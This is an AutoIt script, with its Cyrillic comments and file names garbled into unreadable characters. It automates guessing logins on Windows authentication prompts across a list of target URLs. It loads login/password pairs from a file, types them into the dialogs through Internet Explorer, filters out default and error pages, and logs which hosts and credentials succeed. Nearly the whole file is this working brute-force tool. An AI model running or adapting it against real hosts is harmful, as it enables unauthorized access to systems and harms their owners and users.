#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Outfile=��������_�����������_���_�������_x32.exe
#AutoIt3Wrapper_Outfile_x64=��������_�����������_���_�������_x64.exe
#AutoIt3Wrapper_Compile_Both=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include <array.au3>
#include <WinAPI.au3>
#include <ScreenCapture.au3>
#include <IE.au3>
#include <log.au3>
;~ Opt("MustDeclareVars", 1) ; ����������� �������� ����������
HotKeySet("{F7}", "_Exit")
Global $Paused, $oIE, $hLog, $OnlySearch, $sleep, $sleepMin, $sleepLoad, $CountTestPass, $hFileDone, $hFileFindWin, $hFileFindWeb, $aDone, $RestartIE
Local $fileDone, $fileFindWin, $fileFindWeb
$hLog = _Log_Open(@ScriptDir & '\�������������.log', '### ��� ��������� ��������_���_������� ###')
$fileDone = @ScriptDir & '\��������������.txt'
$fileFindWin = @ScriptDir & '\���������_��_������������_����.txt'
$fileFindWeb = @ScriptDir & '\���������_��_html_��������.txt'
$fileCorrect = @ScriptDir & '\���������_������.txt'

$OnlySearch = 0; ������������� � ����� ������ ������
$sleep = 500 ;����������� ����� �������� ����� ����������
$sleepMin = 100 ; ����������� ����� �������� ����� ����������
$sleepLoad = 10000 ;�������� �������� ��������

$CountTestPass = 2
Local $Content, $Strings, $IgnorWordList, $WhiteList, $IgnorRegExpList, $timer, $q = 0, $shet
Global $titleWinPassword, $controlWinLogin, $controlWinPass, $controlWinButtonOK, $controlWinButtonCANCEL, $titleWinList, $aIgnorWordList, $aWhiteList, $aIgnorRegExpList
; ��������� ���� windows c �������� ������
$titleWinPassword = '������������ Windows'
$titleWinList = '������������ Windows|����������� �'
$controlWinLogin = '[CLASS:Edit; INSTANCE:1]'
$controlWinPass = '[CLASS:Edit; INSTANCE:2]'
$controlWinButtonOK = '[CLASS:Button; INSTANCE:2]'
$controlWinButtonCANCEL = '[CLASS:Button; INSTANCE:3]'

$IgnorWordList = 'ErrorPageTemplate|<h1>Welcome to nginx|Apache HTTP Server Test Page|� �������� ����������|>Under construction<|Site is under construction|<h1>It works!</h1>|This is the default web page||If you are the owner of this website, please contact your hosting provider|>Default Web Site Page<|>Welcome to the home of <|>Forbidden<|Apache is functioning normally|' & _
		'���� ��������|>Shared IP<|>There is no site here<|>default.domain<|>400 Bad Request|>401 Unauthorized|>402 Payment Required|>403 Forbidden|>404 Not Found|>405 Method Not Allowed|>406 Not Acceptable|>407 Proxy Authentication Required|>408 Request Timeout|>409 Conflict|>410 Gone|>411 Length Required|>412 Precondition Failed|>413 Request Entity Too Large|>414 Request-URL Too Long|>415 Unsupported Media Type|>416 Requested Range Not Satisfiable|>417 Expectation Failed|>418 I' & "'" & 'm a teapot|>422 Unprocessable Entity|>423 Locked|>424 Failed Dependency|>425 Unordered Collection|>426 Upgrade Required|>428 Precondition Required|>429 Too Many Requests|>431 Request Header Fields Too Large|>434 Requested host unavailable|>449 Retry With|>451 Unavailable For Legal Reasons|>300 Multiple Choices|>301 Moved Permanently|>302 Found|>302 Moved Temporarily|>303 See Other|>304 Not Modified|>305 Use Proxy|>306 (���������������)|>307 Temporary Redirect|>500 Internal Server Error|>501 Not Implemented|>502 Bad Gateway|>503 Service Unavailable|>504 Gateway Timeout|>505 HTTP Version Not Supported|>506 Variant Also Negotiates|>507 Insufficient Storage|>509 Bandwidth Limit Exceeded|>510 Not Extended|>511 Network Authentication Required|>100 Continue|>101 Switching Protocols|>200 OK|>201 Created|>202 Accepted|>203 Non-Authoritative Information|>204 No Content|>205 Reset Content|>206 Partial Content|>408 Request Time-out|>414 Request URL Too Long|>504 Gateway Time-out|>505 HTTP Version not supported'
$aIgnorWordList = StringSplit($IgnorWordList, '|')
$IgnorRegExpList = '(?i)<title>.*?nginx.*?</title>|(?i)<title>.*?nginx.*?</title>|(?i)<title>.*?nginx.*?</title>|(?i)<title>.*?Shared IP.*?</title>|(?i)<title>.*?Apache.*?</title>|(?i)<title>.*?Test Page.*?</title>|(?i)<title>.*?Default.*?</title>|(?i)<title>.*?It works.*?</title>|(?i)<title>.*?Under construction.*?</title>|(?i)<title>.*?� �������� ����������.*?</title>|(?i)<title>.*?default web page.*?</title>|(?i)<title>.*?Default Web Site.*?</title>|(?i)<title>.*?default web.*?</title>|(?i)<title>.*?Welcome to the home.*?</title>|(?i)<title>.*?Welcome to home.*?</title>|(?i)<title>.*?Debian.*?</title>|(?i)<title>.*?Test .*?</title>|(?i)<title>.*?example.*?</title>|(?i)<title>.*?IIS .*?</title>|(?i)<title>.*?lighttpd.*?</title>|(?i)<title>.*?Resin.*?</title>|(?i)<title>.*?Cherokee.*?</title>|(?i)<title>.*?Rootage.*?</title>|(?i)<title>.*?THTTPD.*?</title>|(?i)<title>.*?httpd.*?</title>|(?i)<title>.*?HTTP File Server.*?</title>|(?i)<title>.*?Sambar.*?</title>|(?i)<title>.*?TinyWeb.*?</title>|(?i)<title>.*?Squid.*?</title>|(?i)<title>.*?3proxy.*?</title>|(?i)<title>.*?HandyCache.*?</title>|(?i)<title>.*?UserGate.*?</title>|(?i)<title>.*?no site.*?</title>'
$aIgnorRegExpList = StringSplit($IgnorRegExpList, '|')
$WhiteList = 'none|���������� ������������'
$aWhiteList = StringSplit($WhiteList, '|')

; ��������� ���������� �� ���������� ������
Dim $CmdLineN[2]
If $CmdLine[0] = 1 Then
	$CmdLineN = $CmdLine
Else
	$CmdLineN[0] = 1
	$CmdLineN[1] = @ScriptDir & '\VNC_bypauth.txt'
EndIf

;��������� ������� � �������
Local $aTemp, $tpos, $TempRead, $schetchik, $noneString, $filePass = @ScriptDir & '\VNC_LoginPass.txt'
If Not FileExists($filePass) And $OnlySearch = 0 Then MsgBox(0, ' ������', ' �� ������ ���� � �������� ��������: ' & @CRLF & $filePass)
$TempRead = FileRead($filePass)
$TempRead = StringReplace(StringReplace(StringReplace(StringReplace($TempRead, @CRLF, @CR), @LF, @CR), @CR & @CR, @CR), @CR, @CRLF) ;���������� ����� ��� ������� �� ������
$aTemp = StringSplit($TempRead, @CRLF, 1)
$noneString = '(none)'
Global $aLoginPass
Dim $aLoginPass[$aTemp[0]][2]
$schetchik = 0
For $i = 1 To $aTemp[0]
	If StringLeft($aTemp[$i], 4) = '####' Then ContinueLoop
	$tpos = StringInStr($aTemp[$i], @TAB)
	If $tpos > 0 Then
		$aLoginPass[$schetchik][0] = StringLeft($aTemp[$i], $tpos - 1)
		$aLoginPass[$schetchik][1] = StringMid($aTemp[$i], $tpos + 1)
	Else
		$aLoginPass[$schetchik][0] = $aTemp[$i]
		$aLoginPass[$schetchik][1] = ''
	EndIf
	If StringInStr($aLoginPass[$schetchik][0], $noneString) Then $aLoginPass[$schetchik][0] = ''
	If StringInStr($aLoginPass[$schetchik][1], $noneString) Then $aLoginPass[$schetchik][1] = ''
	$schetchik += 1
Next
;~ 	$aLoginPass[$i-1][0]
;~ Local $aLoginPass[6][2] = [['admin1', 'admin'], ['admin2', ''], ['admin3', ''], ['admin4', 'admin'], ['admin5', ''], ['admin6', '']]


;������ ������� ������
$Content = FileRead($CmdLineN[1]) ;������ ������� ������ �� �����
$Content = StringReplace(StringReplace(StringReplace(StringReplace($Content, @CRLF, @CR), @LF, @CR), @CR & @CR, @CR), @CR, @CRLF) ;���������� ����� ��� ������� �� ������
$Strings = StringSplit($Content, @CRLF, 1) ;�������� �� ������ � ������
$Content = ''
Global $aStrings
Dim $aStrings[$Strings[0] + 1][2]
For $i = 0 To $Strings[0] ; �������� ������ ������� � ��������� ������
	$aStrings[$i][0] = $Strings[$i]
Next
$Strings = ''
_Log_Report($hLog, '��������� ������� ������: ' & $aStrings[0][0] & @CRLF)

;�������� ��������������� ������
If Not FileExists($fileDone) Then FileWrite($fileDone, '������ ����������� �������:' & @CRLF)
$aDone = StringSplit(FileRead($fileDone), @CRLF)
_ArraySort($aDone, 0, 1)
$hFileDone = FileOpen($fileDone, 1)
$hFileFindWin = FileOpen($fileFindWin, 1)
$hFileFindWeb = FileOpen($fileFindWeb, 1)
$hfileCorrect = FileOpen($fileCorrect, 1)

_startIE() ; ������ ��������
$shet = 0
For $i = 1 To $aStrings[0][0]
	$timer = TimerInit()
	$RestartIE = 0
	If _ArrayBinarySearch($aDone, $aStrings[$i][0], 1) = -1 Then ; �������� �� ���������� �� ��� ���� �����
		$shet += 1
		_IEStartCheck($i);������ �������� ������ � ��������
		If TimerDiff($timer) > 10 Or $shet < 10 Then
			$q = 0
			FileWriteLine($fileDone, $aStrings[$i][0] & @CRLF)
		Else
			If $q > 50 Then _Exit('����� �� ������: ������� ������� ������� ������')
			$q += 1
		EndIf
		Sleep($sleep)
	EndIf
Next

Func _IEStartCheck($iadd)
	Local $a, $t, $html, $search, $w
	ConsoleWrite($aStrings[$iadd][0] & @CRLF)
	_IENavigate($oIE, $aStrings[$iadd][0], 0) ;��������� �� ��������
	For $w = 1 To 4
		$a = _IELoadWait($oIE, 100, $sleepLoad / 4);������� ��������� �������� ��������
		If $a = 1 Then ExitLoop
		If WinExists($titleWinPassword) Then ExitLoop
	Next
	_getHWND()
	If TimerDiff($timer) > $sleepLoad Then $RestartIE = 1
	If WinExists($titleWinPassword) Then _CheckWinPass($iadd)
	If $RestartIE = 1 Then ;��������� �������� �������� ��������
		$html = _IEDocReadHTML($oIE)
		If StringLen($html) < 100 Then ;�������� ������� �� ������������� ��������
			_IEQuit($oIE)
			Sleep(1000)
			For $i = 1 To 5
				If Not ProcessExists('iexplore.exe') Then ExitLoop
				ProcessClose('iexplore.exe')
				Sleep($sleepMin)
			Next
			Sleep($sleep)
			_startIE() ; ������ ��������
			Return 0
		EndIf
	EndIf

;~ 	ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $a = ' & $a & @CRLF) ;### Debug Console
	$html = _IEDocReadHTML($oIE)
	;����������� ���� �� �� �������� �������
	$search = 1
	For $i = 1 To $aIgnorWordList[0] ;���������� ������������ ������� �� ������
		If StringInStr($html, $aIgnorWordList[$i]) Then
			$search = 0
			ExitLoop
		EndIf
	Next
	For $i = 1 To $aIgnorRegExpList[0] ;���������� ������������ ������� �� ������
		If StringRegExp($html, $aIgnorRegExpList[$i]) Then
			$search = 0
			ExitLoop
		EndIf
	Next
	For $i = 1 To $aWhiteList[0] ; ��������� ������������ ������� � �����, ���� ��� ���� ���������
		If StringInStr($html, $aWhiteList[$i]) Then
			$search = 1
			ExitLoop
		EndIf
	Next

	If $search = 1 And StringLen($html) > 100 Then
		_Log_Report($hLog, '������ ������� �� �����: ' & $aStrings[$iadd][0] & @CRLF)
		FileWriteLine($hFileFindWeb, $aStrings[$iadd][0] & @CRLF)
	EndIf
;~ 	ConsoleWrite($html)
EndFunc   ;==>_IEStartCheck

Func _startIE()
	$oIE = _IECreate('about:blank', 0, 0)
	_IEAction($oIE, 'visible')
	Sleep(1000)
EndFunc   ;==>_startIE

Func _CheckWinPass($iadd)
	Local $a, $t, $c
	_Log_Report($hLog, '������ ������ ������ � ��������� ���� �� �����: ' & $aStrings[$iadd][0] & @CRLF)
	FileWriteLine($hFileFindWin, $aStrings[$iadd][0] & @CRLF)
	If $OnlySearch = 1 Then
		_cancelWindowPass() ;������ �����
		Return 1
	EndIf

	_getHWND()
	;��������� ����������� �������� ��� ������������ ������
	If $aStrings[$iadd][1] = '' Then
		_cancelWindowPass() ;������ �����
		Sleep($sleep * 2)
		$aStrings[$iadd][1] = _IEDocReadHTML($oIE) ;������ �����������
		_IEStartCheck($iadd)
		Return 1
	EndIf



	For $p = 0 To 0;UBound($aLoginPass) - 1 Step $CountTestPass ; ���� ���� �� ���������� ��� ������
		If WinWait($titleWinPassword, '', 1) = 0 Then Return 0 ;����� ���� �� ���������� ���� ����� ������
		For $i = 0 To $CountTestPass - 1
			WinActivate($titleWinPassword) ;��������� ����
			ControlSend($titleWinPassword, '', $controlWinLogin, $aLoginPass[$p + $i][0]) ;�������� ������
			Sleep($sleepMin)
			ControlSend($titleWinPassword, '', $controlWinPass, '{TAB}') ;���
			Sleep($sleepMin)
			ControlSend($titleWinPassword, '', $controlWinPass, $aLoginPass[$p + $i][1]) ;�������� ������
			Sleep($sleepMin)
			ControlSend($titleWinPassword, '', $controlWinPass, '{ENTER}') ; Enter
			Sleep($sleepMin)
			; �������� ������ �� ������ ������
			Sleep($sleep * 2)
			$html = _IEDocReadHTML($oIE) ;������ �����������
			If StringRegExpReplace($html, '[0-9]', '') = StringRegExpReplace($aStrings[$iadd][1], '[0-9]', '') Then
				ConsoleWrite(' ����� � ������ �� �������: ' & $aLoginPass[$p + $i][0] & '   ' & $aLoginPass[$p + $i][1] & @CRLF)
			Else
				ConsoleWrite(' ����� � ������ �������: ' & $aLoginPass[$p + $i][0] & '   ' & $aLoginPass[$p + $i][1] & @CRLF)
				FileWriteLine($hfileCorrect, $aStrings[$iadd][0] & '   ' & $aLoginPass[$p + $i][0] & '   ' & $aLoginPass[$p + $i][1] & @CRLF)
				return 2
			EndIf
		Next
		;������ ����� � ������������ ��������
		For $c = 1 To 10
			If WinWait($titleWinPassword, '', 1) = 0 Then ExitLoop
			ControlSend($titleWinPassword, '', $controlWinPass, '{ENTER}') ; Enter
			Sleep($sleepMin)
			ControlClick($titleWinPassword, '', $controlWinButtonCANCEL) ; ���� �� ������ ������
			Sleep($sleep)
		Next

		Sleep($sleep)

		; �������� ���������� �����, ���������� ������� � ����� �� ������ �����...
		If $p > UBound($aLoginPass) - 3 Then ContinueLoop
		_IENavigate($oIE, $aStrings[$iadd][0], 0) ;��������� �� ��������
		$a = _IELoadWait($oIE, 500, $sleepLoad);������� ��������� �������� ��������
		$t = WinWait($titleWinPassword, '', $sleepLoad / 1000)
		If $t = 0 Then ; ������ �������
			Sleep($sleep)
			_IENavigate($oIE, $aStrings[$iadd][0], 0) ;��������� �� ��������
			$a = _IELoadWait($oIE, 500, $sleepLoad);������� ��������� �������� ��������
			$t = WinWait($titleWinPassword, '', $sleepLoad / 1000)
		EndIf

	Next

EndFunc   ;==>_CheckWinPass

Func _cancelWindowPass() ;������ �����
	For $c = 1 To 20
		If WinWait($titleWinPassword, '', 1) = 0 Then ExitLoop
		ControlSend($titleWinPassword, '', $controlWinPass, '{ENTER}') ; Enter
		Sleep($sleepMin)
		ControlClick($titleWinPassword, '', $controlWinButtonCANCEL) ; ���� �� ������ ������
		Sleep($sleep)
	Next
EndFunc   ;==>_cancelWindowPass


Func _getHWND() ;������� ��������� ��������� ����
	Local $hwnd, $t
	Opt("WinTitleMatchMode", 1)
	$t = StringSplit($titleWinList, '|')
	For $i = 1 To $t[0]
		If WinExists('[TITLE:' & $t[$i] & '; CLASS:#32770]') Then
			$titleWinPassword = '[TITLE:' & $t[$i] & '; CLASS:#32770]'
			Return $titleWinPassword
		EndIf
	Next
	Return $titleWinPassword
EndFunc   ;==>_getHWND


Func _Exit($msg = '')
	If $msg <> '' Then _Log_Report($hLog, $msg & @CRLF)
	FileClose($hFileDone)
	FileClose($hFileFindWin)
	FileClose($hFileFindWeb)
	Exit
EndFunc   ;==>_Exit


Func _ClearHTML($sText)
	Local $0, $DelAll, $DelTag, $i, $Rep, $teg, $Tr
	$Tr = 0
	$teg = 'p|div|span|html|body|b|table|td|tr|th|font|img|br'
	$sText = StringRegExpReplace($sText, '(?s)<!--.*?-->', '') ; �������� ������������

	; ============= ���� colspan, rowspan
	$0 = Chr(0)
	$Rep = StringRegExp($sText, '(?s)(<[^<>]+?(?:colspan|rowspan)[^<>]+?>)', 3) ; � ������
	If Not @error Then
		$Tr = 1
		$sText = StringRegExpReplace($sText, '(?s)(<[^<>]+?(?:colspan|rowspan)[^<>]+?[^/]>)', $0) ; ��������� �������
	EndIf
	$sText = StringRegExpReplace($sText, '(?s)(<(?:' & $teg & '))[\r\n]* [^<>]*?(>)', '\1\2') ; �������

	If $Tr Then
		For $i = 0 To UBound($Rep) - 1
			$Rep[$i] = _Replace($Rep[$i])
			$sText = StringReplace($sText, $0, $Rep[$i], 1)
		Next
	EndIf
	; =============

	$sText = StringReplace($sText, '<p><o:p>&nbsp;</o:p></p>', '<br><br>') ; ������ ��������� �����
	; $sText=StringRegExpReplace($sText, '(?s)(<('&$teg&').*?>)(.*?)</\2>(\s*)\1', '\1\3\4') ; ������� ������������
	$sText = StringRegExpReplace($sText, '(?s)<(' & $teg & ')[^<>]*?>[\x{A0}\s]*?</\1>', '') ; ������� ����� ��� ��������

	$DelAll = 'xml|style|script'
	$sText = StringRegExpReplace($sText, '(?s)<(' & $DelAll & ')[^<>]*>(.*?)</\1>', '') ; �������� � ����������

	$DelTag = 'span'
;~ 	$sText = StringRegExpReplace($sText, '(?s)</?(' & $DelTag & ')[^<>]*>', '') ; �������� ����� �����

	Return $sText
EndFunc   ;==>_ClearHTML

Func _Replace($Rep)
	$teg = 'table|td|tr|th'
	$aRep = StringRegExp($Rep, '((?:colspan|rowspan)\h*=\h*"?\d+"?)', 3)
	$Rep = StringRegExpReplace($Rep, '(?s)(<(?:' & $teg & ')) .*?(>)', '\1') ; �������
	For $i = 0 To UBound($aRep) - 1
		$Rep &= ' ' & $aRep[$i]
	Next
	$Rep &= '>'
	Return $Rep
EndFunc   ;==>_Replace

